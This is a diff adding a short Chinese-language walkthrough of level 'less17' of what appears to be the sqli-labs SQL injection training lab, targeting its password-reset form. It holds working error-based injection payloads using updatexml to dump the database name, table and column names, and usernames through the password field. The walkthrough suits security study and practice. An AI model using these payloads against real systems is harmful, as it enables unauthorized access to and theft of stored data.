@@ -1,0 +1,17 @@
+<hr>
+<h2 id="title-less17url-https-www-yuque-com-u29002979-ep2zrx-ke7ss7lpyoyfocak"><a href="#title-less17url-https-www-yuque-com-u29002979-ep2zrx-ke7ss7lpyoyfocak" class="headerlink" title="title: less17url: https://www.yuque.com/u29002979/ep2zrx/ke7ss7lpyoyfocak"></a>title: less17<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/ke7ss7lpyoyfocak">https://www.yuque.com/u29002979/ep2zrx/ke7ss7lpyoyfocak</a></h2><pre><code class="bash">@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;
+</code></pre>
+<p><code>uname=1&#39;</code></p>
+<blockquote>
+<p>[PASSWORD RESET]</p>
+</blockquote>
+<p>提示密码重设置,<br>&amp;#x20;<strong>注入点是密码的位置</strong> <a name="irTrU"></a></p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre><code class="bash">查询数据库表
+passwd=admin&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)-- +
+爆破数据表
+passwd=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) -- +
+爆破字段名
+passwd=1&#39; and updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name=&#39;users&#39; limit 8,1),0x7e),1) -- +
+爆破字段
+passwd=1&#39; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) -- +
+</code></pre>
